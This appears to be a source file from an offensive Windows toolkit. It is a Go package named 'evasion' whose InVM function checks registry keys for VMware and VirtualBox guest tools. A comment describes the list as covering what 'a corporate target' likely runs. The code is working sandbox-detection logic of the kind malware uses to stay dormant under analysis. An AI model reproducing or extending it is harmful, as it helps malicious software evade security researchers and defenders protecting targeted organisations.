//go:build windows

package evasion

import (
	"syscall"
	"unsafe"
)

var (
	vmAdvapi32 = syscall.NewLazyDLL("advapi32.dll")

	vmProcRegOpenKeyExW = vmAdvapi32.NewProc("RegOpenKeyExW")
	vmProcRegCloseKey   = vmAdvapi32.NewProc("RegCloseKey")
)

// Predefined registry roots and access masks. Naming follows the
// Windows SDK.
const (
	hkeyLocalMachine = 0x80000002
	keyRead          = 0x20019
)

// vmToolKeys are registry paths whose presence indicates a hypervisor
// guest. The list covers the mainstream products a corporate target
// is likely to run.
var vmToolKeys = []string{
	`SOFTWARE\VMware, Inc.\VMware Tools`,
	`SOFTWARE\Oracle\VirtualBox Guest Additions`,
	`SYSTEM\CurrentControlSet\Services\VBoxGuest`,
	`SYSTEM\CurrentControlSet\Services\VBoxMouse`,
	`SYSTEM\CurrentControlSet\Services\vmci`,
	`SYSTEM\CurrentControlSet\Services\vmhgfs`,
}

// InVM returns true if any known VM-tool registry key is present.
//
// This is one signal among several, not an answer. A hardened VM
// removes these keys; a bare-metal host with a leftover VM-tool
// install trips them. Use it to make a decision, not to make the
// decision.
func InVM() bool {
	for _, key := range vmToolKeys {
		if regKeyExists(key) {
			return true
		}
	}
	return false
}

func regKeyExists(path string) bool {
	pathPtr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return false
	}
	var hKey uintptr
	r, _, _ := vmProcRegOpenKeyExW.Call(
		hkeyLocalMachine,
		uintptr(unsafe.Pointer(pathPtr)),
		0,
		keyRead,
		uintptr(unsafe.Pointer(&hKey)),
	)
	if r != 0 {
		return false
	}
	vmProcRegCloseKey.Call(hKey)
	return true
}